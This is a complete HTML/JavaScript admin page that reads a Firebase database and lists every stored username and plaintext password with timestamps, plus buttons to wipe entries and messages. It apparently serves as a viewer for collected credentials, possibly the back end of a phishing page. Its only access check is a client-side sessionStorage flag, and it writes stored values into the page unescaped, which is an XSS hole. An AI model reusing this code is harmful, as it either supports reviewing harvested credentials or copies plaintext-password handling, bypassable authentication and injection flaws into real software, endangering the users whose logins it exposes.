<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Authorized Users</title>
  <style>
    body { font-family: sans-serif; margin: 2em; background-color: black; color:white;}
    h2 { margin-top: 0; }
    #entriesBox { border: 1px solid #ccc; padding: 1em; border-radius: 6px; width: 50%;}
    .entry { border-bottom: 1px solid #ddd; padding: 0.5em 0; }
    .entry:last-child { border-bottom: none; }
    button { margin-top: 1em; }
  </style>
</head>
<body>

  <h2>Authorized Users</h2>
  <div id="entriesBox"><p>Loading entries...</p></div>
  <button id="clear">Clear All</button>
  <button id="logout">Logout</button>
  <button id="clearm">Clear messages</button>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyBGPFSP0e0oYqKqvJHLB5eGlX9mJ8aU09s",
      authDomain: "test-da143.firebaseapp.com",
      databaseURL: "https://test-da143-default-rtdb.firebaseio.com",
      projectId: "test-da143",
      storageBucket: "test-da143.firebasestorage.app",
      messagingSenderId: "58366480447",
      appId: "1:58366480447:web:f3dd12850f09952b49688a",
      measurementId: "G-T5HK7JTWHW"
    };

    // Initialize Firebase (v8)
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Only allow if admin logged in
    if (sessionStorage.getItem("adminAccess") !== "true") {
      alert("Access denied.");
      window.location.href = "index.html";
    }

    const box = document.getElementById("entriesBox");

    // Render list
    function render(data) {
      box.innerHTML = "";
      if (!data) {
        box.innerHTML = "<p>No entries yet.</p>";
        return;
      }
      const entries = Object.entries(data).sort((a,b)=>b[1].timestamp - a[1].timestamp);
      for (const [key, val] of entries) {
        const div = document.createElement("div");
        div.className = "entry";
        div.innerHTML = `
          <strong>Username:</strong> ${val.username}<br>
          <strong>Password:</strong> ${val.password}<br>
          <small>${new Date(val.timestamp).toLocaleString()}</small><br>
          <button data-key="${key}">Delete</button>
        `;
        div.querySelector("button").onclick = () => {
          if (confirm("Delete this entry?")) db.ref("users/" + key).remove();
        };
        box.appendChild(div);
      }
    }

    // Live updates
    db.ref("users").on("value", snap => render(snap.val()));

    // Clear all
    document.getElementById("clear").onclick = () => {
      if (confirm("Clear all entries?")) db.ref("users").remove();
    };

    // Logout
    document.getElementById("logout").onclick = () => {
      sessionStorage.removeItem("adminAccess");
      window.location.href = "index.html";
    };
  </script>
      <script>
    document.getElementById("clearm").onclick = () => {
      if (confirm("Clear all entries?")) db.ref("messages").remove();
    };
    </script>
</body>
</html>
